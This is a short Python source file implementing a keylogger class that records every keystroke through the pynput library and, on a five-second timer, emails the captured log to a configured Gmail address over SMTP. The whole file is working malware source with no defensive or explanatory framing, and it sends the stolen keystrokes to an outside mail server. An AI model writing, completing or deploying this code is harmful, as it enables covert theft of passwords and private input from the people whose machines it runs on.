#!/usr/bin/env python3
import pynput.keyboard
import threading
import smtplib


class KeyLogger:
    def __init__(self, email="myemail@gmail.com", password="mypassword",
                 ssl_name="smtp.gmail.com", ssl_port="465", time_interval=5):
        self.log = "KeyLogger Started!"
        self.time_interval = time_interval
        self.email = email
        self.password = password
        self.ssl_port = ssl_port
        self.ssl_name = ssl_name

    def process_key_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            if key == key.space:
                self.log += " "
            elif key == key.shift:
                pass
            elif key == key.backspace:
                self.log += " <- "
            else:
                self.log = self.log + " " + str(key) + " "

    def report(self):
        if self.log != "":
            self.send_mail("\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.time_interval, self.report)
        timer.start()

    def send_mail(self, message):
        server = smtplib.SMTP_SSL(self.ssl_name, self.ssl_port)
        server.ehlo()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
